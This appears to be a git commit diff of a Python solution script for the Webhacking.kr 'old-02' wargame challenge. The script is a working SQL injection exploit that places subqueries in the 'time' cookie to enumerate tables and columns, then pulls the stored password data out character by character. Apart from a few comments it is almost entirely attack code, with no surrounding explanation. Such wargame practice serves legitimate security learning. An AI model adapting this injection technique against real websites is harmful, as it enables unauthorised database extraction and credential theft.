39deea6701e713d164086f035a4f8f1cfd7d9e8a
Dancat <69895365+sunmangul@users.noreply.github.com>
2021-01-13 20:22:45 +0900

    Add files via upload

--- web/Webhacking.kr/old-02.py
+++ web/Webhacking.kr/old-02.py
@@ -7,11 +7,12 @@ count = ''
 length = 0
 
 url = "https://webhacking.kr/challenge/web-02"
-session = ""
+session = "your session"
 
 print ("! Start")
 
-print ("! Find number of tables")
+# Table number
+print ("! Find the number of tables")
 try:
 	cookie = "(select count(table_name) from information_schema.tables where table_schema=database())"
 	cookies = { 'time' : cookie, 'PHPSESSID' : session }
@@ -21,8 +22,9 @@ except:
 	print('! Error')
 length = length[22:24]
 count = int(length)
-print ("! Found number of tables : ", int(length))
+print ("! Found the number of tables : ", int(length))
 
+#Table name length
 print ("\n! Find length of the tables_name")
 tlen = [count]
 for i in range(0, count):
@@ -39,7 +41,7 @@ for i in range(0, count):
 	tlen.insert(i, length)
 	print ("! Found length : ", tlen[i])
 
-
+#table name
 print ("\n! Find table_name")
 tname = [count]
 for j in range(0, count):
@@ -63,6 +65,7 @@ for j in range(0, count):
 			print ("! name : " + name)
 	print ("! Found name : " + tname[j])
 
+#column length
 print ("\n! Find length of the columns_name")
 plen = [count]
 for i in range(0, count):
@@ -78,6 +81,7 @@ for i in range(0, count):
 	plen.insert(i, length)
 	print ("! Found length : ", plen[i])
 
+#column name
 print ("\n! Find column_name")
 cname = [count]
 for j in range(0, count):
@@ -100,4 +104,41 @@ for j in range(0, count):
 			print ("! name : " + name)
 	print ("! Found name : " + cname[j])
 
-print ("! Find length of data")
+#pw(data) length
+print ("\n! Find length of data")
+dlength = [count]
+for i in range(0, count):
+	try:
+		cookie = f"(select length({cname[i]}) from {tname[i]})"
+		cookies = { 'time' : cookie, 'PHPSESSID' : session }
+		r = requests.post(url, cookies=cookies)
+	except:
+		print("! Error")
+		continue
+	length = r.text
+	length = int(length[22:24])
+	dlength.insert(i,length)
+	print("! Found length : ", dlength[i])
+
+# #pw(data)
+print ("\n! Find data")
+dname = [count]
+for j in range(0, count):
+	name = ''
+	for i in range(1, dlength[j]+1):
+		try:
+			cookie = f"(select ascii(substring({cname[j]}, {i}, 1)) from {tname[j]} limit 0, 1)"
+			cookies = { 'time' : cookie, 'PHPSESSID' : session }
+			r = requests.post(url, cookies=cookies)
+		except:
+			print("! Error")
+			continue
+		length = r.text
+		length = length[19:24]
+		if "01:" in length:
+			length = length.replace("01:", "")
+			length = int(length) + 60
+			name += chr(length)
+			dname.insert(j, name)
+			print("! data : ", dname[j])
+	print("! Found data : ", dname[j])
